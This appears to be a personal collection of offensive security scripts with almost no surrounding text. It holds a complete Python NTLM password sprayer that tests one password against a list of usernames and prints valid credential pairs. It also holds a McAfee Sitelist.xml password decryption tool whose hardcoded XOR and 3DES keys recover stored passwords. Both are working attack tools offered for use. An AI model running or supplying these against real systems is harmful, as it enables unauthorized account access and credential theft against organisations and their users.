ntlm password sprayer

```python
#!/usr/bin/python3

import requests
from requests_ntlm import HttpNtlmAuth
import sys, getopt

class NTLMSprayer:
    def __init__(self, fqdn):
        self.HTTP_AUTH_FAILED_CODE = 401
        self.HTTP_AUTH_SUCCEED_CODE = 200
        self.verbose = True
        self.fqdn = fqdn

    def load_users(self, userfile):
        self.users = []
        lines = open(userfile, 'r').readlines()
        for line in lines:
            self.users.append(line.replace("\r", "").replace("\n", ""))

    def password_spray(self, password, url):
        print ("[*] Starting passwords spray attack using the following password: " + password)
        count = 0
        for user in self.users:
            response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
            if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
                print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
                count += 1
                continue
            if (self.verbose):
                if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
                    print ("[-] Failed login with Username: " + user)
        print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")

def main(argv):
    userfile = ''
    fqdn = ''
    password = ''
    attackurl = ''

    try:
        opts, args = getopt.getopt(argv, "hu:f:p:a:", ["userfile=", "fqdn=", "password=", "attackurl="])
    except getopt.GetoptError:
        print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
        sys.exit(2)

    for opt, arg in opts:
        if opt == '-h':
            print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
            sys.exit()
        elif opt in ("-u", "--userfile"):
            userfile = str(arg)
        elif opt in ("-f", "--fqdn"):
            fqdn = str(arg)
        elif opt in ("-p", "--password"):
            password = str(arg)
        elif opt in ("-a", "--attackurl"):
            attackurl = str(arg)

    if (len(userfile) > 0 and len(fqdn) > 0 and len(password) > 0 and len(attackurl) > 0):
        #Start attack
        sprayer = NTLMSprayer(fqdn)
        sprayer.load_users(userfile)
        sprayer.password_spray(password, attackurl)
        sys.exit()
    else:
        print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
        sys.exit(2)



if __name__ == "__main__":
    main(sys.argv[1:])

```

mcafee script:
- needs updating
```python

```#!/usr/bin/env python
# Info: 
#    McAfee Sitelist.xml password decryption tool
#    Jerome Nokin (@funoverip) - Feb 2016
#    More info on https://funoverip.net/2016/02/mcafee-sitelist-xml-password-decryption/
#
# Quick howto: 
#    Search for the XML element <Password Encrypted="1">...</Password>,
#    and paste the content as argument.
#
###########################################################################

import sys
import base64
from Crypto.Cipher import DES3
from Crypto.Hash import SHA

# hardcoded XOR key
KEY = "12150F10111C1A060A1F1B1817160519".decode("hex")

def sitelist_xor(xs):
    return ''.join(chr(ord(c) ^ ord(KEY[i%16]))for i, c in enumerate(xs))

def des3_ecb_decrypt(data):
    # hardcoded 3DES key
    key = SHA.new(b'<!@#$%^>').digest() + "\x00\x00\x00\x00"
    # decrypt
    des3 = DES3.new(key, DES3.MODE_ECB, "")
    decrypted = des3.decrypt(data)
    # quick hack to ignore padding
    return decrypted[0:decrypted.find('\x00')] or "<empty>"


if __name__ == "__main__":

    if len(sys.argv) != 2:
        print("Usage:   %s <base64 passwd>" % sys.argv[0])
        print("Example: %s 'jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q=='" % sys.argv[0])
        sys.exit(0)

    # read arg
    encrypted_password = base64.b64decode(sys.argv[1]) 
    # decrypt
    password = des3_ecb_decrypt(sitelist_xor(encrypted_password))
    # print out
    print("Crypted password   : %s" % sys.argv[1])
    print("Decrypted password : %s" % password)

    sys.exit(0)
